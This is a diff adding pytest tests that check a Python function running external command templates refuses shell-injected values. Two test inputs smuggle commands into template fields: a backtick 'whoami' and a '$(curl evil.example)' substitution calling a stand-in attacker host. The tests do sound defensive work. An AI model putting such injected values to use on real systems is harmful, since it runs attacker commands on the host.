@@ -66,6 +66,54 @@ class TestRunExternalTemplate:
         assert "subbed" in out
 
 
+class TestInjectionGuard:
+    """Round-29 (Mimosa triage): raw-substituted values must not execute."""
+
+    def test_refuses_backtick_value(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+        monkeypatch.setenv("EVOLVER_LLM_CALL_DIR", str(tmp_path / "calls"))
+        out = run_external_template(
+            "echo {prompt}",
+            {"prompt": "hi `whoami`"},
+            kind="t",
+            record=True,
+        )
+        assert out == ""
+        refused = list((tmp_path / "calls").glob("*_t_refused.txt"))
+        assert len(refused) == 1, "refusal must leave an audit marker"
+        message = refused[0].read_text(encoding="utf-8")
+        assert "_file" in message, "refusal message must point at the file placeholder"
+
+    def test_refuses_command_substitution(self) -> None:
+        out = run_external_template(
+            "echo {diagnosis}",
+            {"diagnosis": "x $(curl evil.example)"},
+            kind="t",
+            record=False,
+        )
+        assert out == ""
+
+    def test_clean_value_still_runs(self) -> None:
+        out = run_external_template(
+            "echo {prompt}",
+            {"prompt": "plain multi\nline text"},
+            kind="t",
+            record=False,
+        )
+        assert "plain multi" in out
+
+    def test_file_passsed_value_not_raw_guarded(self) -> None:
+        # The risky text rides under a key whose raw {key} is NOT in the
+        # template — only the engine-generated {prompt_file} path is
+        # substituted, so the guard must not refuse.
+        out = run_external_template(
+            "echo {prompt_file}",
+            {"prompt": "markdown `code` snippet", "prompt_file": "calls/x_in.json"},
+            kind="t",
+            record=False,
+        )
+        assert "calls/x_in.json" in out
+
+
 class TestBuildLlmCall:
     def test_flag_off_returns_none(self, monkeypatch: pytest.MonkeyPatch) -> None:
         monkeypatch.setenv("EVOLVER_FF_ENABLE_LLM_TEMPLATE", "0")
